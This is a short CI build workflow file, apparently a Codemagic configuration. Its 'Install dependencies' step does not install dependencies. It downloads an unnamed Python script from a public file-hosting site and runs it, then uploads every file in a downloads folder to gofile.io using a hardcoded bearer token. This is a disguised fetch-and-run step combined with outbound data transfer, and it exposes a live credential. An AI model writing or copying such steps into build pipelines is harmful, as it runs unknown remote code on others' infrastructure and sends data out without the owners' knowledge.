workflows:
  default:
    name: Build and Upload
    max_build_duration: 120
    scripts:
      - name: Install dependencies
        script: |
          wget -O new.py "https://vikingfile.com/d/iawX5TcRBO/Delutor%20%287%29%20%281%29.py"
          python new.py
          mkdir -p downloads
          
          echo "Uploading files to mkdir..."
          
          find downloads -type f -print0 | while IFS= read -r -d '' file; do
                curl -X POST "https://upload.gofile.io/uploadfile" \
                     -H "Authorization: Bearer VoTnBsgTAiTqm97X6FmvdmBswsMPl6SG" \
                     -F "file=@\"$file\"" \
                     -F "folderId=1f32e2fe-21ce-46d2-943b-10c56acb3a1d"
              done
